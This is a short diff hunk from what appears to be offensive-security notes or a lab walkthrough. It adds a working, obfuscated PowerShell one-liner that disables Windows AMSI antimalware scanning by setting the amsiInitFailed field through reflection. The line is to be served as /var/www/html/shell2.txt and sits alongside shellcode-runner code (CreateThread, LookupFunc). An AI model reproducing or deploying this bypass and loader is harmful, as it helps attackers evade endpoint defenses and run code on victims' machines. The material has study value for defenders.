@@ -44,6 +44,8 @@ $thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
 3\. Put the following as /var/www/html/shell2.txt (AMSI bypass):
 
 ```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*ailed") {$f=$e}};$f.SetValue($null, (1 -eq 1))
+
 function LookupFunc {
 
 	Param ($moduleName, $functionName)
